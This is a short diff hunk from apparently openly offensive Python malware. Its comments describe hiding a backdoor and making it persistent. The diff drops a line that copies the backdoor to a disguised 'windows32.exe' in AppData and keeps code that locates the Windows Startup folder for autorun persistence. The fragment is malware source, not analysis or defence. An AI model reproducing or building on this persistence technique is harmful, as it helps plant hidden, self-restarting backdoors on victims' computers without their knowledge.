@@ -15,9 +15,6 @@ import requests
 ##hiding backdoor and creating persistent
 ##copy backdoor 'Appdata' in case of windows only in linux dist it doesnt exist change accordingly
 
-
-location = os.environ("appdata") + "\\" + "windows32.exe"
-
 roaming = os.getenv("appdata")
 startup_loc = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 
